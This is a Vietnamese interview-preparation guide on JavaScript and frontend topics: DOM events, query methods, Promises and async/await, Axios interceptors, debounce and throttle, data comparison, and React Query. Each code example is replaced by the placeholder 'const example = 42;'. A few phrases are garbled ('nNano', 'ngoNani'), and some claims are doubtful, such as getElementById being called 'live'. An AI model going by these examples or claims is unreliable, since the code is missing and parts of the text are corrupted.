## 22. Q22: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2 phút):**

**"Sự kiện DOM có 3 giai đoạn: Capturing (từ trên xuống) → Target → Bubbling (từ dưới lên).**

**♻️ Luồng Sự Kiện (3 Giai Đoạn):**
1. **Capturing Phase (Giai đoạn bắt)**: Sự kiện từ `window` → `document` → `html` → ... → phần tử target (từ trên xuống).
2. **Target Phase (Giai đoạn target)**: Sự kiện chạm phần tử target (phần tử được click).
3. **Bubbling Phase (Giai đoạn nổi)**: Sự kiện từ phần tử target → ... → `html` → `document` → `window` (từ dưới lên).

**🔑 Khái Niệm Cốt Lõi:**
- **Mặc định**: Event listeners chạy trong **Bubbling phase** (useCapture = false).
- **Capturing**: Đặt `useCapture: true` → listener chạy trong Capturing phase.

```js
// Ví dụ rút gọn
const example = 42;
```

- **Dừng Lan Truyền**: `event.stopPropagation()` → ngừng bubbling/capturing.
- **Ngăn Hành Vi Mặc Định**: `event.preventDefault()` → ngăn hành vi mặc định (vd: form submit, chuyển link).

**🎯 Mẫu Event Delegation:**
- **Khái niệm**: Gắn listener ở phần tử cha, không phải từng con → tận dụng bubbling.
- **Lợi ích**:
- Hiệu năng: 1 listener thay vì 100 listeners cho 100 items.
- Nội dung động: Không cần gắn lại listeners khi thêm/xóa con.
- **Ví dụ**:

```js
// Ví dụ rút gọn
const example = 42;
```

**🔍 `target` vs `currentTarget`:**
- **`event.target`**: Phần tử thực sự được click (phần tử gốc kích hoạt sự kiện).
- **`event.currentTarget`**: Phần tử có listener gắn vào (đang xử lý sự kiện).
- **Trường hợp**: Delegation → `currentTarget` = cha, `target` = con được click.

```js
// Ví dụ rút gọn
const example = 42;
```

**⚠️ Common Pitfalls:**
- **stopPropagation() overuse**: Ngăn cả analytics tracking, global handlers → dùng thận trọng.
- **preventDefault() vs stopPropagation()**: Khác nhau! preventDefault ngăn default action, stopPropagation ngăn propagation.
- **Event delegation với dynamic content**: Phải check `e.target.matches()` đúng selector.

**💡 Senior Insights:**
- **Performance**: Event delegation giảm memory usage (1 listener vs 1000) và faster DOM manipulation.
- **Passive listeners**: `{ passive: true }` → improve scroll performance (không block scroll while waiting for preventDefault).

```js
// Ví dụ rút gọn
const example = 42;
```

- **once option**: `{ once: true }` → auto remove listener sau 1 lần fire.
- **Capture for debugging**: Dùng capturing phase để intercept events trước khi children handle.

---

**⚡ Quick Summary:**
> Event Bubbling = child → parent. Capturing = parent → child. Delegation = listen ở parent

**💡 Ghi Nhớ:**
- 🎯 **Bubbling**: Event từ child lên parent (default)
- ⬇️ **Capturing**: Event từ parent xuống child (useCapture: true)
- 🎭 **target vs currentTarget**: target = phần tử gốc, currentTarget = phần tử có listener

**❓ Câu Hỏi:**

Giải thích chi tiết cơ chế hoạt động của DOM Events trong JavaScript, bao gồm:

1. Event Flow (Event Bubbling vs Event Capturing)
2. Event Delegation Pattern
3. Sự khác biệt giữa `target` và `currentTarget`
4. Các best practices và common mistakes

**📚 Phần 1: Event Flow - 3 Phases của DOM Events**

**🔥 Cơ Chế Hoạt Động:**

Khi một event xảy ra trên DOM element, nó đi qua 3 phases (giai đoạn):

```js
// Ví dụ rút gọn
const example = 42;
```

**💡 Giải Thích Tiếng Việt:**

- **Capturing Phase (Bắt sự kiện)**: Event "rơi xuống" từ window → document → html → body → ... → target element
- **Target Phase (Mục tiêu)**: Event chạm đến element được click (target)
- **Bubbling Phase (Nổi lên)**: Event "nổi lên" từ target element → ... → body → html → document → window

**🎯 Code Example với Chú Thích Tiếng Việt:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**📚 Phần 2: Event Delegation (Kỹ Thuật Ủy Quyền Event)**

**🔥 Khái Niệm:**

Event Delegation là kỹ thuật thay vì gắn event listener cho từng element con, ta chỉ gắn 1 listener duy nhất cho element cha, sau đó kiểm tra xem element nào được click thông qua `event.target`.

**💡 Lợi Ích:**

1. **Performance tốt hơn**: Chỉ có 1 event listener thay vì hàng trăm/ngàn listeners
2. **Memory hiệu quả**: Ít listeners = ít bộ nhớ
3. **Dynamic content**: Tự động handle các elements được thêm sau
4. **Maintainability**: Code dễ bảo trì hơn

**🎯 Code Example với Chú Thích Chi Tiết:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**📚 Phần 3: target vs currentTarget - Hiểu Rõ Sự Khác Biệt**

**🔥 Định Nghĩa:**

- **`event.target`**: Element THỰC SỰ được click (có thể là element con sâu bên trong)
- **`event.currentTarget`**: Element có EVENT LISTENER được attach (luôn là element ta gọi addEventListener)

**🎯 Code Example:**

```js
// Ví dụ rút gọn
const example = 42;
```

**📌 So Sánh:**

| Property | target | currentTarget |
|----------|--------|---------------|
| **Định nghĩa** | Element THỰC SỰ được click | Element CÓ addEventListener() |
| **Trong event delegation** | Con hoặc cháu của currentTarget | Luôn là parent element |
| **Sử dụng** | Xác định element cụ thể được tương tác | Truy cập data/properties của parent |

---

**✅ Best Practices:**

1. Sử dụng Event Delegation cho dynamic content
2. Sử dụng `closest()` để tìm parent element
3. Check target type trước khi xử lý
4. Sử dụng `stopPropagation()` khi cần thiết
5. Sử dụng `preventDefault()` cho forms và links

**❌ Common Mistakes:**

1. Nhầm lẫn target vs currentTarget
2. Không check element type
3. Quên stopPropagation() khi có nested events
4. Event delegation nhưng không check target
5. Mix capturing và bubbling không rõ ràng
---

## 23. Q23: 🌐 Q12: DOM API & Query Methods

### P1: Tên câu hỏi: 🌐 Q12: DOM API & Query Methods

### P2: Trả lời (Senior):

## 24. Q24: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"DOM API cung cấp methods để query và manipulate DOM. Query methods có performance và behaviors khác nhau - cần hiểu live vs static collections."**

**🔑 4 Query Methods Chính:**

**1. getElementById:**
- **Nhanh nhất** (browser optimize với hash table)
- Return **single element** hoặc `null`
- Unique trong document (IDs phải unique)

**2. querySelector / querySelectorAll:**
- Nhận **CSS selectors** (`.class`, `#id`, `[attr]`, `:nth-child()`)
- `querySelector`: first match, `querySelectorAll`: **NodeList** (static snapshot)
- **Static** → không tự update khi DOM thay đổi

**3. getElementsByClassName / getElementsByTagName:**
- Return **HTMLCollection** (live collection)
- **Live** → tự update khi DOM thay đổi (có thể gây bugs)
- Nhanh hơn querySelectorAll nhưng ít flexible hơn

**4. Performance:**
- `getElementById` > `getElementsByClassName` > `querySelector` > `querySelectorAll` với complex selectors
- **Cache references** khi query nhiều lần cùng element

**⚠️ Lỗi Thường Gặp:**
- Lặp qua `querySelectorAll` mà nghĩ nó là array → phải convert `[...nodeList]` hoặc `Array.from()`
- Iterate HTMLCollection **trong vòng lặp modify DOM** → collection tự update → infinite loop
- Query toàn document khi chỉ cần query trong container → chậm, dùng `container.querySelector()`

**💡 Kiến Thức Senior:**
- **Live vs Static**: HTMLCollection (live) vs NodeList (có thể live hoặc static tùy method)
- `getElementsBy*` → live HTMLCollection
- `querySelectorAll` → static NodeList
- `childNodes` → live NodeList
- **Reflow/Repaint**: Mỗi DOM manipulation có thể trigger layout recalculation
- Batch updates: dùng DocumentFragment hoặc `.innerHTML` thay vì nhiều `.appendChild()`
- Read trước, write sau để tránh **layout thrashing** (đọc offsetHeight → ghi style → đọc → ghi → ...)
- **MutationObserver** hiệu quả hơn polling DOM changes
- Modern frameworks (React, Vue) dùng Virtual DOM để minimize direct DOM manipulation

**⚡ Quick Summary:**
> querySelector = CSS selector. getElementById = nhanh nhất. querySelectorAll = NodeList

**💡 Ghi Nhớ:**
- ⚡ **getElementById**: Nhanh nhất, live
- 🎯 **querySelector**: CSS selector, static
- 📋 **querySelectorAll**: Return NodeList (not array)

**Trả lời:**

- **DOM API**: Các methods để manipulate DOM elements
- **Query Methods**: Các methods để select elements từ DOM
- **Hoạt động**: getElementById, querySelector, getElementsByClassName, etc.
- **Ưu điểm**: Flexible element selection, powerful manipulation
- **Nhược điểm**: Có thể chậm với large DOM, cần hiểu rõ performance

**Code Example:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Best Practices:**

- Sử dụng querySelector cho modern development
- Sử dụng getElementById cho single elements
- Sử dụng addEventListener thay vì onclick
- Sử dụng proper error handling

**Mistakes:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

## 25. Q25: ⚙️ Q13: Async/Await vs Promises vs Callbacks & Promise.all/any/race

### P1: Tên câu hỏi: ⚙️ Q13: Async/Await vs Promises vs Callbacks & Promise.all/any/race

### P2: Trả lời (Senior):

## 26. Q26: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"JavaScript async tiến hóa: Callbacks → Promises → Async/Await. Mỗi mẫu giải quyết code bất đồng bộ với đánh đổi khác nhau.**

**📊 Tiến Hóa Mẫu Async:**
1. **Callbacks**: Hàm làm tham số → thực thi sau khi hoàn thành thao tác bất đồng bộ.
- ❌ Callback Hell (kim tự tháp hủy diệt), xử lý lỗi khó.
- ✅ Đơn giản, hỗ trợ phổ biến.

2. **Promises**: Object đại diện cho việc hoàn thành/thất bại trong tương lai.
- ✅ Chuỗi (`.then()`), xử lý lỗi tốt hơn (`.catch()`), tránh callback hell.
- ❌ Vẫn dài dòng, có thể `.then()` hell.
- **Trạng thái**: Pending → Fulfilled (resolved) | Rejected.

3. **Async/Await**: Cú pháp đường cho Promises → code giống sync.
- ✅ Dễ đọc (như code sync), `try/catch` cho lỗi.
- ❌ Phải dùng `await` trong hàm `async`, tuần tự theo mặc định (không song song).

**🔧 Promise Combinators (4 Phương Thức):**
1. **`Promise.all([p1, p2, p3])`**:
- Đợi TẤT CẢ promises resolve.
- Reject ngay nếu 1 promise reject (thất bại nhanh).
- Trả về mảng kết quả theo thứ tự.
- ✅ Trường hợp: Lấy nhiều tài nguyên, tất cả đều cần.

2. **`Promise.allSettled([p1, p2, p3])`**:
- Đợi TẤT CẢ promises hoàn thành (fulfilled hoặc rejected).
- Không bao giờ reject.
- Trả về mảng `{ status, value/reason }`.
- ✅ Trường hợp: Thực thi tất cả, không quan tâm thành công/thất bại của từng cái.

3. **`Promise.race([p1, p2, p3])`**:
- Resolve/reject với promise đầu tiên hoàn thành (nhanh nhất thắng).
- ✅ Trường hợp: Cơ chế timeout, phản hồi server nhanh nhất.

4. **`Promise.any([p1, p2, p3])`**:
- Resolve với promise đầu tiên fulfilled.
- Reject nếu TẤT CẢ reject (AggregateError).
- ✅ Trường hợp: Cơ chế dự phòng, phản hồi thành công đầu tiên.

**🎯 Practical Examples:**

```js
// Ví dụ rút gọn
const example = 42;
```

**⚠️ Common Mistakes:**
- **Forgot `await`**: Promise không execute → return Promise object, không phải value.
- **Sequential khi có thể parallel**: `await` trong loop → chậm. Dùng `Promise.all()`.

```js
// Ví dụ rút gọn
const example = 42;
```

- **Unhandled rejections**: Missing `.catch()` hoặc `try/catch` → silent failures.
- **Promise.all fail-fast**: 1 promise fail → tất cả fail. Dùng `allSettled` nếu cần.

**💡 Senior Insights:**
- **Error handling**: `try/catch` trong async function catch bất kỳ `await` nNano throw.
- **Top-level await**: ES2022 → `await` ngoNani async function trong modules.
- **Microtask queue**: Promises execute trong microtask queue → priority hơn setTimeout.
- **Cancellation**: Native promises không support cancel → dùng AbortController (fetch) hoặc libraries (Bluebird).

---

**⚡ Quick Summary:**
> Callbacks = nested hell. Promises = chaining. Async/await = sync-like code. Promise.all/any/race/allSettled = combine nhiều promises

**💡 Ghi Nhớ:**
- 🎯 **Callbacks**: Nested = hell, error handling khó
- 📌 **Promises**: Chaining với .then(), error với .catch()
- ⚡ **Async/Await**: Sync-like code, try/catch cho errors
- 🔥 **Combinators**: all (all success), any (first success), race (first done), allSettled (all done)

**Trả lời:**

**Phần 1: Async Patterns**

- **Callbacks**: Functions được pass vào other functions để execute sau
- **Promises**: Objects đại diện cho eventual completion/failure của async operation
- **Async/Await**: Syntactic sugar cho Promises, làm code dễ đọc hơn

**Phần 2: Promise Combinators**

- **Promise.all**: Đợi tất cả promises resolve, reject nếu có 1 promise reject
- **Promise.any**: Resolve khi có 1 promise resolve, reject nếu tất cả reject
- **Promise.race**: Resolve/reject với promise đầu tiên hoàn thành
- **Promise.allSettled**: Đợi tất cả promises complete (resolve hoặc reject)

**Code Example:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Best Practices:**

- Sử dụng async/await cho modern code
- Sử dụng proper error handling
- Tránh callback hell
- Sử dụng TypeScript cho type safety

#### **🔥 Advanced Async Patterns - Các Vấn Đề Bất Đồng Bộ Phức Tạp**

**💡 Sau khi hiểu cơ bản về Callbacks, Promises, Async/Await, hãy giải quyết các vấn đề thực tế phức tạp hơn!**

---

#### **1️⃣ Error Handling - Xử Lý Lỗi Nâng Cao**

**🔹 Problem: Async errors không bị catch**

```js
// Ví dụ rút gọn
const example = 42;
```

**🔹 Problem: Mixed sync/async errors**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **2️⃣ Race Conditions - Xử Lý Tình Huống Chạy Đua**

**🔹 Problem: Multiple concurrent requests**

```js
// Ví dụ rút gọn
const example = 42;
```

**🔹 Problem: Concurrent updates to shared state**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **3️⃣ Timeout & Retry - Xử Lý Timeout & Thử Lại**

**🔹 Problem: Requests hang forever**

```js
// Ví dụ rút gọn
const example = 42;
```

**🔹 Problem: Network failures**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **4️⃣ Concurrency Control - Kiểm Soát Đồng Thời**

**🔹 Problem: Too many concurrent requests**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **6️⃣ Sequential Execution - Chạy Promises Theo Thứ Tự**

**🔹 Problem: Promise.all chạy SONG SONG, không theo thứ tự**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **✅ Giải Pháp: 4 Cách Chạy Sequential**

#### **1. For...of Loop (Đơn giản nhất - Khuyến nghị) ⭐**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **2. Reduce Pattern**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **3. Generator Pattern**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **4. Batched (Cân bằng Speed + Server Load)**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **📊 So Sánh Performance**

```js
// Ví dụ rút gọn
const example = 42;
```

**Bảng So Sánh:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **🎯 Real-World Examples**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **🚨 Common Mistakes**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **💡 Best Practices**

**Khi nào dùng gì?**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **5️⃣ Async Iteration - Xử Lý Dữ Liệu Stream**

**🔹 Problem: Process large datasets**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🎯 Advanced Patterns - Tổng Hợp**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **💡 Best Practices - Tổng Hợp**

**✅ DO:**
1. **Always handle errors**: Try-catch trong async functions
2. **Set timeouts**: Prevent hanging requests
3. **Limit concurrency**: Avoid overwhelming server
4. **Use AbortController**: Cancel unnecessary requests
5. **Implement retry logic**: Handle transient failures
6. **Debounce user input**: Reduce API calls
7. **Stream large data**: Don't load all vào memory
8. **Monitor performance**: Track slow operations

**❌ DON'T:**
1. **Unhandled rejections**: Always catch errors
2. **Infinite retries**: Set max retry limit
3. **Unlimited concurrency**: Control parallel operations
4. **Ignore race conditions**: Handle out-of-order responses
5. **Block UI**: Break long operations into chunks
6. **Forget cleanup**: Cancel pending operations on unmount

---

**🎯 Kết Luận:**

Async programming phức tạp hơn sync nhiều do:
- **Error handling** khó hơn (unhandled rejections)
- **Race conditions** (out-of-order responses)
- **Timeout & retry** logic
- **Concurrency control** (avoid overwhelming)
- **Memory management** (streaming large data)

**📌 Promise Combinators Examples:**

```js
// Ví dụ rút gọn
const example = 42;
```

Nhưng với đúng patterns và tools, bạn có thể xử lý mọi tình huống async một cách hiệu quả! 🚀

---
---

## 27. Q27: 🔌 Q14: Axios Interceptors - Phân Tích Chi Tiết & Tối Ưu Hóa

### P1: Tên câu hỏi: 🔌 Q14: Axios Interceptors - Phân Tích Chi Tiết & Tối Ưu Hóa

### P2: Trả lời (Senior):

## 28. Q28: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"Interceptors là middleware functions chạy trước/sau mỗi request/response, giúp centralize authentication, error handling, logging, và data transformation."**

**🔑 4 Use Cases Chính:**

**1. Authentication & Token Management:**
- Request interceptor: **auto-add JWT token** vào headers
- Response interceptor: **auto-refresh expired tokens** (401 → refresh → retry)
- Pattern: Lưu refresh token, khi 401 → call refresh API → update token → retry failed request

**2. Global Error Handling:**
- **Centralized error processing** - không cần try/catch mọi nơi
- Handle network errors, timeouts, 401/403/500 uniformly
- Show toast notifications, log errors, redirect login

**3. Request/Response Transformation:**
- **Auto format** data: camelCase ↔ snake_case, date strings ↔ Date objects
- Add common headers: `Content-Type`, `Accept-Language`, device info
- Strip sensitive data trước khi log

**4. Performance Monitoring & Retry:**
- Track request **timing** (start time → duration)
- **Exponential backoff retry** cho failed requests
- Circuit breaker pattern (dừng requests sau N failures)

**⚠️ Lỗi Thường Gặp:**
- Không cleanup interceptor khi component unmount → **memory leak**
- Modify request config trực tiếp mà không clone → side effects
- Infinite loop khi retry logic không có **max attempts**
- Token refresh race condition (multiple 401s cùng lúc) → queue requests

**💡 Kiến Thức Senior:**
- **Execution order**: Request interceptors = **LIFO** (last added runs first), Response = **FIFO**
- Interceptor return Promise → có thể **async/await** bên trong
- Eject interceptor: `const id = axios.interceptors.request.use(...); axios.interceptors.request.eject(id)`
- Best practice: Tạo **separate axios instances** cho từng service (auth API, data API) với different interceptors

**⚡ Quick Summary:**
> Interceptors = middleware cho request/response. Transform data, add headers, handle errors

**💡 Ghi Nhớ:**
- 📤 **Request**: Transform request trước khi gửi (add token, headers)
- 📥 **Response**: Process response/error trước khi return
- 🔄 **Chain**: Multiple interceptors chạy theo thứ tự LIFO

**Trả lời:**

**🔥 Core Concepts:**

- **Interceptors**: Middleware functions được execute trước/sau mỗi HTTP request/response
- **Request Interceptors**: Transform/modify requests trước khi gửi đến server (add headers, auth tokens, logging)
- **Response Interceptors**: Process responses hoặc handle errors trước khi return về caller
- **Execution Order**: Request interceptors chạy theo thứ tự LIFO (Last In First Out), Response interceptors chạy theo FIFO (First In First Out)
- **Chain of Responsibility Pattern**: Mỗi interceptor có thể modify data và pass sang interceptor tiếp theo

**✅ Ưu điểm:**

- **Centralized Logic**: Authentication, logging, error handling ở một nơi duy nhất
- **Code Reusability**: Không cần lặp lại logic cho mỗi request
- **Separation of Concerns**: Tách logic infrastructure ra khỏi business logic
- **Global Error Handling**: Xử lý errors thống nhất (401, 403, 500, network errors)
- **Request/Response Transformation**: Format data tự động (camelCase ↔ snake_case)
- **Performance Monitoring**: Track request timing, add metrics
- **Retry Logic**: Tự động retry failed requests với exponential backoff
- **Token Refresh**: Automatically refresh expired tokens trước khi request

**⚠️ Nhược điểm:**

- **Side Effects**: Có thể gây unexpected behaviors nếu không careful
- **Debugging Complexity**: Khó debug khi có nhiều interceptors chained
- **Performance Overhead**: Mỗi interceptor adds processing time
- **Memory Leaks**: Nếu không cleanup properly khi component unmount

**🎯 Use Cases & Hoạt Động Tối Ưu:**

**Code Example - Comprehensive Implementation:**

```js
// Ví dụ rút gọn
const example = 42;
```

**🎯 Best Practices - Tối Ưu Hóa:**

1. **Always Cleanup Interceptors**: Eject interceptors khi component unmount để tránh memory leaks
2. **Use Separate Axios Instances**: Tạo riêng instance cho từng API (auth API, data API, analytics API)
3. **Avoid Heavy Computation**: Interceptors should be fast, avoid blocking operations
4. **Proper Error Handling**: Always return Promise.reject() trong error handler
5. **Token Refresh Strategy**: Implement queue cho multiple requests khi token expired
6. **Development vs Production**: Use different logging levels (verbose in dev, minimal in prod)
7. **Request/Response Transformation**: Centralize data transformation logic (camelCase ↔ snake_case)
8. **Performance Monitoring**: Track slow requests and send metrics to monitoring service
9. **Request Deduplication**: Prevent duplicate identical requests
10. **Rate Limiting**: Implement request queuing to respect API rate limits
11. **Retry Strategy**: Use exponential backoff for failed requests
12. **Timeout Configuration**: Set appropriate timeouts based on endpoint type

**⚠️ Common Mistakes - Lỗi Thường Gặp:**

```js
// Ví dụ rút gọn
const example = 42;
```

**📊 Performance Considerations:**

- **Interceptor Overhead**: Mỗi interceptor adds ~0.1-1ms processing time
- **Memory Usage**: Pending requests map cần cleanup để avoid memory leaks
- **Request Queueing**: Limit concurrent requests to 5-10 tùy server capacity
- **Token Refresh**: Queue all requests khi refreshing để avoid multiple refresh calls
- **Caching**: Cache GET requests trong interceptors để reduce server load
---

## 29. Q29: ⏱️ Q15: Advanced Deferring Execution Techniques - Kỹ Thuật Trì Hoãn Thực Thi Nâng Cao

### P1: Tên câu hỏi: ⏱️ Q15: Advanced Deferring Execution Techniques - Kỹ Thuật Trì Hoãn Thực Thi Nâng Cao

### P2: Trả lời (Senior):

## 30. Q30: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"Deferring execution là kỹ thuật trì hoãn chạy code để optimize performance, bao gồm debounce, throttle, requestIdleCallback, và lazy loading."**

**🔑 5 Kỹ Thuật Chính:**

**1. Debounce:**
- **Chờ user ngừng action** rồi mới execute (delay reset sau mỗi call)
- Use case: search input (chờ user gõ xong), window resize
- Ví dụ: `debounce(fn, 300)` → user gõ → chờ 300ms không gõ nữa → chạy

**2. Throttle:**
- **Execute tối đa 1 lần trong X ms**, bỏ qua calls giữa interval
- Use case: scroll events, mouse move, API rate limiting
- Ví dụ: `throttle(fn, 1000)` → chạy ngay, ignore calls trong 1s tiếp theo

**3. requestIdleCallback:**
- Chạy task khi browser **idle** (không busy với rendering/user input)
- Use case: analytics, non-critical updates, prefetching data
- Fallback: `setTimeout(fn, 1)` cho browsers không support

**4. requestAnimationFrame:**
- Execute **trước next repaint** (~60fps = 16.67ms)
- Use case: animations, smooth scrolling, visual updates
- Better than `setTimeout` vì sync với browser refresh rate

**5. Lazy Loading / Code Splitting:**
- Load code/assets **only when needed** (dynamic import)
- Use case: route-based splitting, below-fold images, modals
- React: `React.lazy(() => import('./Component'))`

**⚠️ Lỗi Thường Gặp:**
- Debounce search mà không **cancel previous request** → race condition
- Throttle scroll mà không check `passive: true` → jank
- requestIdleCallback cho critical tasks → user thấy lag
- Không cleanup timers khi unmount → memory leak

**💡 Kiến Thức Senior:**
- **Debounce vs Throttle**: Debounce = "chờ xong hẳn", Throttle = "giới hạn tần suất"
- Leading vs Trailing edge: Leading chạy ngay lần đầu, Trailing chạy sau delay
- **IntersectionObserver** hiệu quả hơn scroll throttle cho lazy loading (native API)
- Web Workers cho **heavy computations** không block main thread
- Priority scheduling: `scheduler.postTask()` API (Chrome) với priorities (user-blocking, user-visible, background)

```js
// Ví dụ rút gọn
const example = 42;
```

#### **1.2. Axios vs Fetch API - So Sánh Chi Tiết**

```js
// Ví dụ rút gọn
const example = 42;
```

### **2. Axios Instance & Configuration**

#### **2.1. Create Custom Instance**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **2.2. Full Request Configuration**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **3. Request Cancellation - Hủy Request**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **4. File Upload & Download**

#### **4.1. File Upload with Progress**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **4.2. File Download**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **5. Error Handling - Xử Lý Lỗi Chi Tiết**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **6. Advanced Features**

#### **6.1. Retry Logic**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **6.2. Request Deduplication**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **6.3. Response Caching**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **💡 Best Practices**

```js
// Ví dụ rút gọn
const example = 42;
```

---
---

## 31. Q31: 🔀 Q16: Compare Data Types - Objects, Strings, Big Numbers & Decimals

### P1: Tên câu hỏi: 🔀 Q16: Compare Data Types - Objects, Strings, Big Numbers & Decimals

### P2: Trả lời (Senior):

## 32. Q32: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"So sánh data types phức tạp cần hiểu: Objects so sánh reference vs value, Strings xử lý Unicode/locale, Big Numbers/Decimals dùng libraries vì floating point precision issues."**

**🔑 4 Khái Niệm Chính:**

**1. Object Comparison - Shallow vs Deep:**
- **Shallow**: So sánh reference + primitive values ở level 1
- `{a:1} === {a:1}` → `false` (different references)
- Use case: React.memo, shouldComponentUpdate
- **Deep**: Recursive compare tất cả nested properties
- Dùng lodash `_.isEqual()` (handle circular refs, Date, RegExp)
- ⚠️ O(n) complexity, có thể infinite loop

**2. String Comparison - Unicode & Locale:**
- **`===` operator**: So sánh **binary representation** (không hiểu Ă ≠ A)
- **`localeCompare()`**: So sánh theo **ngôn ngữ** (tiếng Việt: à < á < ả < ã < ạ)
- Ví dụ: `'à'.localeCompare('á', 'vi')` → `-1` (à đứng trước)
- **`Intl.Collator`**: Performance cao hơn cho nhiều comparisons
- ⚠️ Unicode variants: é (e + ́) vs é (single char) → dùng `.normalize('NFC')`

**3. Big Numbers - Precision Issues:**
- JavaScript Number: **53-bit precision** → max safe integer = 2^53 - 1
- **Floating point error**: `0.1 + 0.2 !== 0.3` (binary representation)
- **Solutions**:
- `BigInt` (native): integers only, không có decimals
- Libraries: `decimal.js`, `big.js`, `bignumber.js` (arbitrary precision)
- ⚠️ KHÔNG dùng `===` cho decimals → dùng epsilon: `Math.abs(a - b) < Number.EPSILON`

**4. Financial Calculations:**
- Dùng **integers** (cents, đồng) thay vì floats: `1.99` → `199` cents
- Libraries: `dinero.js` (money), `currency.js` (currency math)
- Format: `Intl.NumberFormat` cho localized currency display

**⚠️ Lỗi Thường Gặp:**
- Deep compare objects trong render → re-render loop (dùng `useMemo`)
- So sánh strings không normalize Unicode → "café" ≠ "café"
- Tính toán tiền bằng floats → rounding errors: `(0.1 + 0.2) * 100 = 30.000000000000004`
- Stringify objects để compare → không handle functions, Date, circular refs

**💡 Kiến Thức Senior:**
- **Structural sharing** (Immer, Redux): shallow copy chỉ modified branches → fast comparison
- **Object.is()** vs `===`: `Object.is(NaN, NaN) = true`, `Object.is(+0, -0) = false`
- JSON.stringify **không stable** (key order) → dùng `fast-json-stable-stringify`
- Banking systems: **double-entry bookkeeping**, store as integers, round at display layer only

**⚡ Quick Summary:**
> So sánh dữ liệu phức tạp: Objects (deep/shallow), Strings (localeCompare, Unicode), Big Numbers/Decimals (precision handling)

**💡 Ghi Nhớ:**
- 🎯 **Objects**: Shallow (reference) vs Deep (recursive) - dùng lodash isEqual cho circular refs
- 🌍 **Strings**: `localeCompare()` cho tiếng Việt, `Intl.Collator` cho performance
- 💰 **Big Numbers**: Dùng libraries (decimal.js, big.js) - KHÔNG dùng `===` cho floating point
- ⚠️ **Traps**: `{a:1} === {a:1}` = false, `0.1 + 0.2 !== 0.3`, Unicode variants

---
---

## 33. Q33: 🔄 Q17: React Query (TanStack Query) - Data Fetching, Caching & State Management

### P1: Tên câu hỏi: 🔄 Q17: React Query (TanStack Query) - Data Fetching, Caching & State Management

### P2: Trả lời (Senior):

## 34. Q34: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"React Query là thư viện quản lý DỮ LIỆU TỪ SERVER, khác với state nội bộ ứng dụng (Redux/Zustand).**

**📦 Khái Niệm Cốt Lõi:**
- **Dữ liệu Server vs State Client**: Dữ liệu server = bất đồng bộ, chia sẻ, có thể cũ (thông tin user, bài viết). State client = đồng bộ, cục bộ (trạng thái UI, dữ liệu form).
- **Query (Truy vấn)**: Lấy và lưu cache dữ liệu bằng `useQuery({ queryKey, queryFn })`. QueryKey = định danh cache + mảng phụ thuộc.
- **Mutation (Thay đổi)**: Chỉnh sửa dữ liệu server bằng `useMutation()`, tự động làm mới các query liên quan.
- **Chiến lược Cache**: `staleTime` (dữ liệu tươi bao lâu) vs `gcTime` (thời gian giữ cache sau khi component unmount).

**🔑 Refetch vs Invalidate:**
- **`refetch()`**: Buộc lấy lại dữ liệu ngay lập tức (kích hoạt thủ công).
- **`invalidateQueries()`**: Đánh dấu dữ liệu cũ → tự động lấy lại ở background nếu component đang hiển thị.
- **Thực hành tốt**: Dùng `invalidateQueries` sau khi thay đổi dữ liệu để tự động đồng bộ giao diện.

**♻️ Vòng Đời Query (7 giai đoạn):**
1. **Fresh (Tươi)**: Dữ liệu mới lấy, còn trong `staleTime` → không lấy lại.
2. **Stale (Cũ)**: Hết `staleTime` → sẵn sàng lấy lại khi có kích hoạt (focus cửa sổ, mount, interval).
3. **Fetching (Đang lấy)**: Đang gọi API (background hoặc lần đầu).
4. **Inactive (Không hoạt động)**: Component unmount → query không active.
5. **Garbage Collection (Thu hồi)**: Sau `gcTime` (mặc định 5 phút) → xóa cache.
6. **Error (Lỗi)**: Lấy dữ liệu thất bại → tự động thử lại với thời gian chờ tăng dần.
7. **Paused (Tạm dừng)**: Chế độ offline → tạm dừng lấy dữ liệu, tiếp tục khi online.

**🎯 Các Trường Hợp Sử Dụng:**
- **Tự động lấy lại**: Focus cửa sổ, kết nối lại mạng, polling theo khoảng thời gian.
